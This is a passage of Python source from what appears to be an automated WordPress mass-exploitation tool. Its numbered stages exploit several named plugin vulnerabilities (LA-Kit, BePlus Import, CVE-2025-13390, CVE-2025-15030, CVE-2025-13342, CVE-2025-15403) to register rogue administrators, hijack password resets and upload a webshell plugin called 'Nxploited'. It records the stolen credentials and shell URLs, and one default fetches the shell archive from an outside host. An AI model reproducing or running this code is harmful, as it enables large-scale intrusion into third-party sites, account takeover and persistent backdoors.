            html = r.text
            m = re.search(r'"ajaxNonce"\s*:\s*"([a-zA-Z0-9_-]{5,})"', html)
            if m: return m.group(1)
            for pat in [r"ajaxNonce['\"]?\s*:\s*['\"]([a-zA-Z0-9_-]{5,})['\"]",
                        r"['\"]ajaxNonce['\"]\s*[:=]\s*['\"]([a-zA-Z0-9_-]{5,})['\"]",
                        r'data-ajaxnonce=["\']([a-zA-Z0-9_-]{5,})["\']',
                        r'data-ajax-nonce=["\']([a-zA-Z0-9_-]{5,})["\']']:
                m2 = re.search(pat, html, re.I)
                if m2: return m2.group(1)
        return None

    def lakit_register_admin(site, nonce, email, password, username):
        base = normalize_url(site)
        endpoint = f"{base}/wp-admin/admin-ajax.php"
        data = {"action": "lakit_ajax", "_nonce": nonce, "actions": f'{{"req1":{{"action":"register","data":{{"email":"{email}","password":"{password}","username":"{username}","lakit_field_log":"yes","lakit_field_pwd":"yes","lakit_field_cpwd":"no","lakit_bkrole":"1","lakit_recaptcha_response":""}}}}}}'}
        try:
            r = requests.post(endpoint, data=data, timeout=timeout, verify=False, allow_redirects=True,
                             headers={"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
            return r.status_code, (r.text or "")
        except Exception:
            return 0, ""

    def verify_full_admin(site, username, password):
        base = normalize_url(site)
        login_url = f"{base}/wp-login.php"
        sess = build_session(timeout)
        try:
            sess.get(login_url, timeout=timeout, verify=False)
        except Exception:
            pass
        login_data = {"log": username.strip(), "pwd": password, "wp-submit": "Log In", "testcookie": "1"}
        headers = {"User-Agent": get_random_ua(), "Cookie": "wordpress_test_cookie=WP Cookie check",
                   "Content-Type": "application/x-www-form-urlencoded", "Referer": login_url}
        try:
            r = sess.post(login_url, data=login_data, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
        except Exception:
            return False
        content = (r.text or "").lower()
        fails = ["incorrect username or password", "invalid username", "invalid password", "error: the username",
                  "is not registered", "authentication failed", "login failed", "unknown username", "error: the password you entered"]
        if any(ind in content for ind in fails): return False
        success_ind = ["dashboard", "wp-admin-bar", "adminmenu", "wp-admin/index.php", "wp-admin/profile.php"]
        could_be_logged = any(ind in content for ind in success_ind)
        cookie_header = r.headers.get("Set-Cookie", "")
        if "wordpress_logged_in" in cookie_header or any(c.name.startswith("wordpress_logged_in") for c in sess.cookies):
            could_be_logged = True
        if not could_be_logged: return False
        for u in [f"{base}/wp-admin/plugin-install.php", f"{base}/wp-admin/plugin-install.php?tab=upload",
                   f"{base}/wp-admin/plugins.php?page=plugin-install"]:
            try:
                rr = sess.get(u, timeout=timeout, verify=False, allow_redirects=False, headers={"User-Agent": get_random_ua()})
            except Exception:
                continue
            if rr.status_code == 200 and "wp-login.php" not in (rr.url or ""):
                txt = (rr.text or "").lower()
                if any(ind in txt for ind in ["plugin-install-tab", "upload-plugin", "plugin-upload-form",
                                               "install-plugin-upload", "pluginzip", "browse plugins", "add plugins"]):
                    return True
            elif rr.status_code in (301, 302) and "wp-login.php" in rr.headers.get("Location", ""):
                return False
        return False

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base: return False
            nonce = extract_ajax_nonce(target)
            if not nonce: return False
            status_code, resp_text = lakit_register_admin(target, nonce, ADMIN_EMAIL, ADMIN_PASSWORD, ADMIN_USERNAME)
            if status_code != 200: return False
            low = resp_text.lower()
            response_success = any(m in low for m in ['"success":true', "'success':true", '"type":"success"', '"status":"success"', "created successfully"])
            login_ok = verify_full_admin(target, ADMIN_USERNAME, ADMIN_PASSWORD)
            if response_success and login_ok:
                stage_write(stage_name, "success_results.txt",
                            f"{base} | USERNAME:{ADMIN_USERNAME} | EMAIL:{ADMIN_EMAIL} "
                            f"| PASSWORD:{ADMIN_PASSWORD} | LOGIN:FULL_ADMIN_OK | RESP_SUCCESS:YES | NONCE:{nonce}")
                safe_write_result("vulnurls.txt", base)
                safe_write_result("login.txt", f"{base} | {ADMIN_USERNAME} | {ADMIN_PASSWORD} | {ADMIN_EMAIL} | {base}/wp-login.php")
                return True
            elif response_success and not login_ok:
                log_info(stage_name, f"{base} AJAX success but login failed")
                return False
            elif not response_success and login_ok:
                log_info(stage_name, f"{base} login OK but no AJAX marker")
                return False
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 23: BEPLUS IMPORT (Alon)
# ============================================================================

def run_beplus_import(targets: List[str], threads: int, timeout: int) -> Dict:
    """BePlus Import shell upload: probe beplus import -> verify Alone theme -> trigger install -> verify shell."""
    stage_name = "BePlus-Import"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting BePlus Import full chain ({len(targets)} targets)")

    SHELL_ZIP = resolve_credential("shell_zip", "")
    if not SHELL_ZIP:
        SHELL_ZIP = resolve_credential("shell_url", "http://scroolnum.joe.dj/Nxploited.zip")

    def extract_slug_from_url(shell_url):
        try:
            parts = shell_url.split("/")
            idx = parts.index("plugins") + 1
            return parts[idx]
        except Exception:
            base = os.path.basename(shell_url)
            if "." in base: return base.split(".")[0]
            return base or "unknown"

    def get_php_shell_url(shell_url, target_url):
        base_name = os.path.basename(shell_url)
        new_name = base_name[:-4] + ".php" if base_name.endswith(".zip") else base_name
        return target_url.rstrip("/") + f"/wp-content/plugins/{new_name}"

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base: return False
            session = build_session(timeout)
            ajax_url = f"{base}/wp-admin/admin-ajax.php"
            try:
                pr = session.post(ajax_url, data={"action": "beplus_import_pack_install_plugin"}, timeout=timeout, verify=False)
                if '"success":true' not in pr.text: return False
            except Exception:
                return False
            theme_alone = False
            try:
                hr = session.get(f"{base}/", timeout=timeout, verify=False)
                sm = re.search(r"/wp-content/themes/[^/]+/style.css", hr.text or "")
                if sm:
                    sr = session.get(f"{base}{sm.group(0)}", timeout=timeout, verify=False)
                    if "Theme Name: Alone" in sr.text: theme_alone = True
            except Exception:
                pass
            if not theme_alone:
                try:
                    hr2 = session.get(f"{base}/", timeout=timeout, verify=False)
                    if "alone" in (hr2.text or "").lower(): theme_alone = True
                except Exception:
                    pass
            plugin_slug = extract_slug_from_url(SHELL_ZIP)
            data = {"action": "beplus_import_pack_install_plugin", "plugin": plugin_slug, "shell": SHELL_ZIP}
            try:
                session.post(ajax_url, data=data, timeout=timeout * 2, verify=False)
                php_shell_url = get_php_shell_url(SHELL_ZIP, base)
                sr2 = session.head(php_shell_url, timeout=timeout, verify=False)
                if sr2.status_code == 200:
                    stage_write(stage_name, "success_results.txt", f"{base} | {php_shell_url}")
                    stage_write(stage_name, "uploaded_shells.txt", php_shell_url)
                    safe_write_result("vulnurls.txt", base)
                    return True
            except Exception:
                pass
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 24: CVE-2025-13390
# ============================================================================

def run_cve_2025_13390(targets: List[str], threads: int, timeout: int) -> Dict:
    """CVE-2025-13390: auto-login cookie extraction -> extract _wpnonce -> upload Nxploited.zip plugin."""
    stage_name = "CVE-2025-13390"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "cve_2025_13390_results.txt"
    log_info(stage_name, f"Starting CVE-2025-13390 full chain ({len(targets)} targets, {threads} threads)")
    plugin_zip_data = load_plugin_zip()
    if plugin_zip_data is None:
        log_err(stage_name, "Nxploited.zip not found — plugin upload will be skipped. "
                 f"Put '{GLOBAL_CONFIG.get('plugin_zip', 'Nxploited.zip')}' in the script directory "
                 "or set [files] plugin_zip = ... in settings.ini")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            user_id = 1
            import hashlib as hs
            token = hs.md5(str(user_id).encode()).hexdigest()[:10]

            try:
                ar = session.get(f"{base}/?auto-login=1&user_id={user_id}&token={token}", timeout=timeout, verify=False, allow_redirects=False)
                cookies = {}
                for k, v in ar.headers.items():
                    if k.lower() == "set-cookie":
                        if "wordpress_logged_in" in v or "wordpress_" in v:
                            parts = v.split(";")[0].strip()
                            if "=" in parts:
                                n, val = parts.split("=", 1)
                                cookies[n.strip()] = val.strip()
                if not cookies:
                    return False
            except Exception:
                return False

            s2 = build_session(timeout)
            for k, v in cookies.items():
                s2.cookies.set(k, v)

            try:
                uf = s2.get(f"{base}/wp-admin/plugin-install.php?tab=upload", timeout=timeout, verify=False)
                nm = re.search(r'name="_wpnonce"\s+value="([^"]+)"', uf.text)
                if not nm:
                    return False
                wpnonce = nm.group(1)
            except Exception:
                return False

            if plugin_zip_data is not None:
                zip_name = GLOBAL_CONFIG.get("plugin_zip", "Nxploited.zip")
                files = {"pluginzip": (os.path.basename(zip_name), plugin_zip_data, "application/zip")}
                data = {"_wpnonce": wpnonce, "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload", "install-plugin-submit": "Install Now"}
                try:
                    up = s2.post(f"{base}/wp-admin/update.php?action=upload-plugin", data=data, files=files, timeout=timeout * 2, verify=False, allow_redirects=True)
                    if up.status_code == 200 and ("installed successfully" in up.text.lower() or "successfully" in up.text.lower()):
                        stage_write("CVE-2025-13390", f"{base}/wp-content/plugins/Nxploited/Nx.php")
                        safe_write_result("vulnurls.txt", base)
                        return True
                except Exception:
                    pass
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 25: CVE-2025-15030 AUTO UPLOAD
# ============================================================================

def run_wp_reset_auto_upload(targets: List[str], threads: int, timeout: int) -> Dict:
    """WP Reset Auto upload: trigger wp-login reset flow -> login -> 3-tier deploy Nxploited/Nx.php."""
    stage_name = "WP-Reset-Auto"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting WP Reset Auto Upload full chain ({len(targets)} targets)")
    plugin_zip_data = load_plugin_zip()
    if plugin_zip_data is None:
        log_err(stage_name, "Nxploited.zip not found — plugin upload will be skipped.")

    def split_wp_base(url):
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urlparse(url)
        base_host = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"
        if path == "/":
            return base_host, ""
        return base_host, path.rstrip("/")

    def build_wp_url(base_host, wp_base, path):
        if not path.startswith("/"):
            path = "/" + path
        full = (wp_base + path).replace("//", "/")
        return base_host + full

    def get_wp_base_path(login_path):
        if login_path == "/wp-login.php":
            return ""
        return login_path.replace("/wp-login.php", "")

    def build_shell_url(base_url, wp_base_path):
        base = base_url.rstrip("/")
        path = wp_base_path.rstrip("/") if wp_base_path else ""
        if path:
            return f"{base}{path}/wp-content/plugins/Nxploited/Nx.php"
        return f"{base}/wp-content/plugins/Nxploited/Nx.php"

    def check_admin_access(sess, root_url):
        admin_paths = ["/wp-admin/index.php", "/wp-admin/profile.php", "/wp-admin/edit.php", "/wp-admin/plugins.php", "/wp-admin/users.php"]
        markers = ['id="adminmenu"', 'id="wpadminbar"', '<div id="wpwrap">', 'class="wp-admin', 'id="wpcontent"', 'id="wpbody-content"', "users.php", "plugins.php", "edit.php"]
        deny = ["sorry, you are not allowed to access this page", "you do not have sufficient permissions", "insufficient permissions"]
        ok_pages = 0
        for ep in admin_paths:
            u = root_url.rstrip("/") + ep
            try:
                r = sess.get(u, timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            if r.status_code != 200: continue
            if "wp-login.php" in (r.url or ""): return False
            content = r.text or ""
            low = content.lower()
            if any(d in low for d in deny): return False
            if sum(1 for m in markers if m in content) >= 3: ok_pages += 1
            if ok_pages >= 2: return True
        try:
            r2 = sess.get(root_url.rstrip("/") + "/wp-admin/plugin-install.php", timeout=timeout, allow_redirects=True)
            if r2.status_code == 200:
                low2 = (r2.text or "").lower()
                if any(d in low2 for d in deny): return False
                if "upload-plugin" in low2 or "plugin-install-tab" in low2: return True
        except Exception:
            pass
        return ok_pages >= 1

    def strict_login_attempt(sess, base_host, wp_base, login_path, username, password):
        root_site = build_wp_url(base_host, wp_base, "/")
        login_url = build_wp_url(base_host, wp_base, login_path)
        try:
            sess.get(login_url, timeout=timeout, allow_redirects=True)
        except Exception:
            pass
        data = {"log": username.strip(), "pwd": password, "wp-submit": "Log In", "testcookie": "1"}
        try:
            r = sess.post(login_url, data=data, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        content = (r.text or "").lower()
        fails = ["incorrect username or password", "invalid username", "invalid password", "error: the username",
                  "is not registered", "authentication failed", "login failed", "unknown username"]
        if any(x in content for x in fails): return False
        if not any(c.name.startswith("wordpress_logged_in") for c in sess.cookies): return False
        return check_admin_access(sess, root_site)

    def find_wp_login_path(sess, base_host, wp_base):
        for p in ["/wp-login.php", "/wordpress/wp-login.php", "/wp/wp-login.php", "/blog/wp-login.php", "/cms/wp-login.php", "/wp/login.php"]:
            try:
                r = sess.get(build_wp_url(base_host, wp_base, p), timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            txt = r.text or ""
            if r.status_code == 200 and "<form" in txt and "password" in txt.lower():
                return p
        return "/wp-login.php"

    AUTHOR_PATTERN = re.compile(r"/author/([^/]+)")
    AUTHOR_BODY_PATTERNS = [
        re.compile(r'author-\w+">([a-z0-9_\-]+)<', re.I),
        re.compile(r"/author/([a-z0-9_\-]+)/", re.I),
        re.compile(r'"slug":"([a-z0-9_\-]+)"', re.I),
        re.compile(r'"username":"([a-z0-9_\-]+)"', re.I),
    ]

    def collect_candidates(base_host, wp_base):
        sess = build_session(timeout)
        root = build_wp_url(base_host, wp_base, "/")
        users = set()
        for i in range(1, 11):
            try:
                u = f"{root}/?author={i}"
                r = sess.get(u, timeout=timeout, allow_redirects=False)
                if r.status_code in (301, 302):
                    loc = r.headers.get("location", "") or r.headers.get("Location", "")
                    m = AUTHOR_PATTERN.search(loc)
                    if m: users.add(m.group(1))
                r2 = sess.get(u, timeout=timeout, allow_redirects=True)
                if r2.status_code == 200 and r2.text:
                    for patt in AUTHOR_BODY_PATTERNS:
                        for x in patt.findall(r2.text): users.add(x)
            except Exception:
                continue
        try:
            api = root.rstrip("/") + "/wp-json/wp/v2/users"
            r3 = sess.get(api, timeout=timeout)
            if r3.status_code == 200:
                data = r3.json()
                if isinstance(data, list):
                    for entry in data:
                        if isinstance(entry, dict):
                            for key in ("slug", "username", "name"):
                                v = entry.get(key)
                                if v: users.add(str(v))
        except Exception:
            pass
        parsed = urlparse(root)
        host = parsed.netloc.split(":")[0].lower()
        if host.startswith("www."): host = host[4:]
        first_label = host.split(".")[0]
        if first_label and len(first_label) > 2: users.add(first_label)
        users.add("admin")
        users = {u for u in users if u and 2 < len(u) < 50}
        return sorted(users) if users else ["admin"]

    def trigger_wp_reset_flow_core(sess, base_host, wp_base, username, new_password):
        root = build_wp_url(base_host, wp_base, "/")
        lost_url = root.rstrip("/") + "/wp-login.php?action=lostpassword"
        malicious_key = "hackedresetkey"
        try:
            r1 = sess.post(lost_url, data={"user_login": username, "user_pass": malicious_key, "wp-submit": "Get New Password"},
                           timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        if r1.status_code not in (200, 302): return False
        rp_url = root.rstrip("/") + f"/wp-login.php?action=rp&key={malicious_key}&login={username}"
        try:
            r2 = sess.get(rp_url, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        if r2.status_code not in (200, 302): return False
        reset_url = root.rstrip("/") + "/wp-login.php?action=resetpass"
        try:
            r3 = sess.post(reset_url, data={"pass1": new_password, "pass2": new_password, "pw_weak": "on",
                                             "rp_key": malicious_key, "wp-submit": "Save Password"},
                           timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        return r3.status_code == 200

    def upload_nxploited_plugin(session, base_url, login_path, username, password, wp_base_path):
        if not plugin_zip_data: return False, None
        login_url = f"{base_url}{login_path}"
        headers = {'User-Agent': get_random_ua()}
        try:
            session.get(login_url, timeout=timeout, verify=False, headers=headers)
        except Exception:
            pass
        login_data = {'log': username.strip(), 'pwd': password, 'wp-submit': 'Log In', 'testcookie': '1'}
        headers = {'User-Agent': get_random_ua(), 'Cookie': 'wordpress_test_cookie=WP Cookie check',
                   'Content-Type': 'application/x-www-form-urlencoded', 'Referer': login_url}
        try:
            session.post(login_url, data=login_data, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
        except Exception:
            pass
        shell_url = build_shell_url(base_url, wp_base_path)
        # Method 1: plugin-install upload
        upload_url = f"{base_url}{wp_base_path}/wp-admin/plugin-install.php?tab=upload"
        try:
            upload_page = session.get(upload_url, timeout=timeout, verify=False, headers={'User-Agent': get_random_ua()})
            if upload_page.status_code == 200:
                nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_page.text)
                if nonce_match:
                    nonce = nonce_match.group(1)
                    files = {'pluginzip': ('Nxploited.zip', plugin_zip_data, 'application/zip')}
                    form_data = {'_wpnonce': nonce, '_wp_http_referer': f'{wp_base_path}/wp-admin/plugin-install.php?tab=upload', 'install-plugin-submit': 'Install Now'}
                    upload_endpoint = f"{base_url}{wp_base_path}/wp-admin/update.php?action=upload-plugin"
                    upload_response = session.post(upload_endpoint, data=form_data, files=files, timeout=timeout, verify=False, allow_redirects=True)
                    if upload_response.status_code == 200 and ('installed successfully' in upload_response.text.lower() or 'successfully' in upload_response.text.lower()):
                        test_r = session.get(shell_url, timeout=timeout, verify=False, headers={'User-Agent': get_random_ua()})
                        if test_r.status_code == 200: return True, shell_url
        except Exception:
            pass
        # Method 2: REST API
        try:
            rest_upload_url = f"{base_url}{wp_base_path}/wp-json/wp/v2/plugins"
            rest_resp = session.post(rest_upload_url, data=plugin_zip_data,
                                     headers={'User-Agent': get_random_ua(), 'Content-Type': 'application/zip',
                                              'Content-Disposition': 'attachment; filename="Nxploited.zip"'},
                                     timeout=timeout, verify=False)
            if rest_resp.status_code in (200, 201):
                test_r = session.get(shell_url, timeout=timeout, verify=False, headers={'User-Agent': get_random_ua()})
                if test_r.status_code == 200: return True, shell_url
        except Exception:
            pass
        # Method 3: editor
        shell_php_code = '<?php\nif (!defined(\'ABSPATH\')) exit;\necho "Nxploited";\n?>'
        for fm_url in [f"{base_url}{wp_base_path}/wp-admin/plugin-editor.php", f"{base_url}{wp_base_path}/wp-admin/theme-editor.php"]:
            try:
                fm_resp = session.get(fm_url, timeout=timeout, verify=False, headers={'User-Agent': get_random_ua()})
                if fm_resp.status_code == 200 and 'wp-login.php' not in fm_resp.url:
                    nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', fm_resp.text)
                    if nonce_match:
                        create_data = {'_wpnonce': nonce_match.group(1), 'action': 'edit-theme-plugin-file',
                                       'file': '../plugins/Nxploited/Nx.php', 'newcontent': shell_php_code,
                                       'docs-list': '', 'submit': 'Update File'}
                        c_resp = session.post(fm_url, data=create_data, timeout=timeout, verify=False, allow_redirects=True)
                        if c_resp.status_code == 200:
                            test_r = session.get(shell_url, timeout=timeout, verify=False, headers={'User-Agent': get_random_ua()})
                            if test_r.status_code == 200: return True, shell_url
            except Exception:
                continue
        return False, None

    def parse_pb_reset_link(url):
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            key = qs.get("key", [None])[0]
            login = qs.get("login", [None])[0]
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            if not key or not login: return None
            return base_url, key, login
        except Exception:
            return None

    def trigger_pb_reset_from_link(sess, reset_url, new_password):
        try:
            r = sess.get(reset_url, timeout=timeout, allow_redirects=True)
        except Exception:
            return False, None
        if r.status_code != 200: return False, None
        body = r.text or ""
        nonce = re.search(r'name="password_recovery_nonce_field2"\s+value="([^"]+)"', body, re.I)
        user_data = re.search(r'name="userData"\s+value="([^"]+)"', body, re.I)
        if not nonce or not user_data: return False, None
        parsed = urlparse(reset_url)
        qs = parse_qs(parsed.query)
        key = qs.get("key", [None])[0]
        login = qs.get("login", [None])[0]
        if not key or not login: return False, None
        post_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        data = {"action2": "recover_password2", "password_recovery_nonce_field2": nonce.group(1),
                "userData": user_data.group(1), "key": key, "login": login, "passw1": new_password, "passw2": new_password}
        try:
            r2 = sess.post(post_url, data=data, timeout=timeout, allow_redirects=True)
        except Exception:
            return False, None
        low = (r2.text or "").lower()
        if "your password has been successfully changed" in low: return True, login
        if "invalid key" in low: return False, login
        return False, login

    def exploit_target(target: str) -> bool:
        try:
            base_host, wp_base = split_wp_base(target)
            label = f"{base_host}{wp_base or ''}"
            new_pass = resolve_credential("password", "Nxploited_adminSA")
            sess = build_session(timeout)
            ok_flow = trigger_wp_reset_flow_core(sess, base_host, wp_base, "admin", new_pass)
            if not ok_flow: return False
            users = collect_candidates(base_host, wp_base)
            sess0 = build_session(timeout)
            login_path = find_wp_login_path(sess0, base_host, wp_base)
            wp_base_path = login_path.replace("/wp-login.php", "") if login_path != "/wp-login.php" else ""
            any_hit = False
            for username in users:
                s2 = build_session(timeout)
                if strict_login_attempt(s2, base_host, wp_base, login_path, username, new_pass):
                    ts = time.strftime("%Y-%m-%dT%H:%M:%S")
                    stage_write(stage_name, "wp_login_reset_success.txt",
                                f"[{ts}] {label} | {label}/wp-login.php | account={username}  pass={new_pass}")
                    ok_shell, shell_url = upload_nxploited_plugin(s2, base_host, login_path, username, new_pass, wp_base_path)
                    if ok_shell and shell_url:
                        ts2 = time.strftime("%Y-%m-%d %H:%M:%S")
                        stage_write(stage_name, "shells.txt", f"[{ts2}] {label} - {username}:{new_pass} - SHELL: {shell_url}")
                        safe_write_result("vulnurls.txt", label)
                        safe_write_result("login.txt", f"{label} | {username} | {new_pass} | {username}@nx.com | {label}/wp-login.php")
                    any_hit = True
            return any_hit
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results



# ============================================================================
# STAGE 26: ACF FRONTEND FORM (CVE-2025-13342)
# ============================================================================

def run_acf_frontend_form(targets: List[str], threads: int, timeout: int) -> Dict:
    """CVE-2025-13342: Discover ACF frontend form -> map role field -> register administrator."""
    stage_name = "ACF-FrontendForm"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting ACF Frontend Form full chain ({len(targets)} targets)")

    ACF_REG_PATHS = [
        "/", "/register/", "/registration/", "/signup/", "/sign-up/",
        "/user-registration/", "/user/register/", "/account/", "/my-account/",
        "/myaccount/", "/new-account/", "/member/register/", "/members/register/",
        "/join/", "/frontend-form/", "/frontend-register/", "/frontend-registration/",
    ]
    USERNAME = "Nxadmin1"
    EMAIL = "nxploitedtest@gmail.com"
    PASSWORD = "NxAdmin_1337#KSA"

    def _parse_acf_form(html):
        acf_hidden = {}
        for m in re.finditer(r'<input[^>]+>', html, re.I):
            tag = m.group(0)
            nm = re.search(r'name=["\'](_acf_[^"\']+)["\']', tag)
            vl = re.search(r'value=["\']([^"\']*)["\']', tag)
            if nm:
                acf_hidden[nm.group(1)] = vl.group(1) if vl else ""
        if "_acf_nonce" not in acf_hidden or "_acf_form" not in acf_hidden:
            return None, None
        field_keys = list(dict.fromkeys(re.findall(r'acff\[user\]\[(field_[A-Za-z0-9]+)\]', html)))
        if not field_keys:
            return None, None
        user_fields = {}
        for fkey in field_keys:
            dtype = dname = dlabel = ""
            m = re.search(r'<div[^>]+data-key=["\']' + re.escape(fkey) + r'["\'][^>]*>', html, re.I)
            if m:
                div_tag = m.group(0)
                t = re.search(r'data-type=["\']([^"\']+)["\']', div_tag)
                n = re.search(r'data-name=["\']([^"\']+)["\']', div_tag)
                if t: dtype = t.group(1)
                if n: dname = n.group(1)
            m2 = re.search(r'data-key=["\']' + re.escape(fkey) + r'["\'].*?<label[^>]*>(.*?)</label>', html, re.I | re.S)
            if m2:
                dlabel = re.sub(r'<[^>]+>', '', m2.group(1)).strip().lower()
            user_fields[fkey] = {"type": dtype.lower(), "name": dname.lower(), "label": dlabel}
        return acf_hidden, user_fields

    def _map_fields(user_fields):
        uid = eid = pid = rid = fid = lid = None
        for fkey, info in user_fields.items():
            label = info["label"]
            ftype = info["type"]
            dname = info["name"]
            if not uid and ("username" in label or dname == "fea_username"):
                uid = fkey
            if not eid and ("email" in label or ftype == "user_email"):
                eid = fkey
            if not pid and ("password" in label or ftype == "user_password"):
                pid = fkey
            if not fid and ("first name" in label or dname == "fea_first_name"):
                fid = fkey
            if not lid and ("last name" in label or dname == "fea_last_name"):
                lid = fkey
            if not rid and (ftype == "role" or "role" in label or dname == "fea_role"):
                rid = fkey
        if not (uid and eid and pid and rid):
            return None
        return {"username": uid, "email": eid, "password": pid, "first": fid, "last": lid, "role": rid}

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            for path in ACF_REG_PATHS:
                try:
                    r = session.get(f"{base}{path}", timeout=timeout, verify=False, allow_redirects=True)
                    if r.status_code != 200:
                        continue
                    acf_hidden, user_fields = _parse_acf_form(r.text)
                    if not acf_hidden or not user_fields:
                        continue
                    mapped = _map_fields(user_fields)
                    if not mapped:
                        continue
                    payload = dict(acf_hidden)
                    payload.setdefault("_acf_validation", "1")
                    payload.setdefault("_acf_changed", "1")
                    payload.setdefault("_acf_status", "")
                    payload.setdefault("_acf_message", "")
                    payload.setdefault("_acf_required_message", "")
                    payload["acff[_validate_email]"] = ""
                    payload[f"acff[user][{mapped['username']}]"] = USERNAME
                    payload[f"acff[user][{mapped['email']}]"] = EMAIL
                    payload[f"acff[user][{mapped['password']}]"] = PASSWORD
                    if mapped["first"]:
                        payload[f"acff[user][{mapped['first']}]"] = "Nx"
                    if mapped["last"]:
                        payload[f"acff[user][{mapped['last']}]"] = "ploited"
                    payload[f"acff[user][{mapped['role']}]"] = "administrator"
                    payload["custom_password"] = mapped["password"]
                    payload["password-strength"] = "4"
                    payload["action"] = "frontend_admin/form_submit"
                    ajax_url = f"{base}/wp-admin/admin-ajax.php"
                    headers = {
                        "X-Requested-With": "XMLHttpRequest",
                        "Origin": base,
                        "Referer": f"{base}{path}",
                    }
                    pr = session.post(ajax_url, data=list(payload.items()), headers=headers, timeout=timeout, verify=False)
                    flat = pr.text.replace(" ", "").lower()
                    if '"success":true' in flat:
                        stage_write(stage_name, "acf_frontend_results.txt",
                                    f"{base} | USER:{USERNAME} | PASS:{PASSWORD} | EMAIL:{EMAIL} | FORM:{base}{path}")
                        safe_write_result("vulnurls.txt", base)
                        safe_write_result("login.txt", f"{base} | {USERNAME} | {PASSWORD} | {EMAIL} | {base}/wp-login.php")
                        return True
                except Exception:
                    continue
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 27: REGISTRATIONMAGIC (CVE-2025-15403)
# ============================================================================

def run_registrationmagic(targets: List[str], threads: int, timeout: int) -> Dict:
    """CVE-2025-15403: rm_user_exists -> rm_options_admin_menu privilege escalation + login verify."""
    stage_name = "RegistrationMagic"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting RegistrationMagic full chain ({len(targets)} targets)")

    RM_USERNAME = resolve_credential("username_prefix", "NXploited")
    RM_PASSWORD = resolve_credential("password", "xplpass123")
    ROLE_KEYS = ["_Subscriber", "_Editor", "_Author", "_Contributor"]

    def _exploit_primitive(sess, base, role_key):
        ajax = f"{base}/wp-admin/admin-ajax.php"
        data = {
            "action": "rm_user_exists",
            "rm_slug": "rm_options_admin_menu",
            "order": ",menu1",
            role_key: "1",
            "restore": "false",
            "enable_admin_order": "yes",
        }
        try:
            r = sess.post(ajax, data=data, timeout=timeout, verify=False, allow_redirects=False)
            txt = (r.text or "").lower()
            if "security check failed" in txt or "invalid request" in txt:
                return False
            return r.status_code in (200, 302)
        except Exception:
            return False

    def _try_register(sess, base):
        email = f"{RM_USERNAME}_{random.randint(1000,9999)}@example.com"
        reg_pages = [
            f"{base}/wp-login.php?action=register",
            f"{base}/register/",
            f"{base}/signup/",
        ]
        for reg_url in reg_pages:
            try:
                rr = sess.get(reg_url, timeout=timeout, verify=False, allow_redirects=True)
                if rr.status_code != 200:
                    continue
                nm = re.search(r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']', rr.text)
                nonce = nm.group(1) if nm else None
                data = {"user_login": RM_USERNAME, "user_email": email,
                        "redirect_to": "", "wp-submit": "Register"}
                if nonce:
                    data["_wpnonce"] = nonce
                sess.post(reg_url, data=data, timeout=timeout, verify=False)
                return email
            except Exception:
                continue
        return None

    def _verify_admin(sess, base):
